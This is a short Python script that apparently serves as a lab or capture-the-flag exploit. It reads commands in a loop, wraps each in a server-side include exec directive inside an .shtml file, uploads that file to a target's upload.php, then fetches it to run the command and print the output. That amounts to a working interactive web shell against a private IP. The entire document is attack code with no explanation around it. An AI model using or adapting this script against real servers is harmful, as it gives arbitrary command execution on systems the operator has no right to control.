import requests

while True:
    cmd=input()
    if cmd == "exit":
        exit()
    f=open("shell.shtml","w")
    f.write(f"<!--#exec cmd=\"{cmd}\"-->")
    f.close()
    request_file = {'file_upload':('shell.shtml',open('shell.shtml','rb'),'application/xhtml+xml',{})}
    r=requests.post("http://192.168.41.6:8080/upload.php",files=request_file)
    r=requests.get("http://192.168.41.6:8080/shell.shtml")
    print(r.text,end="")
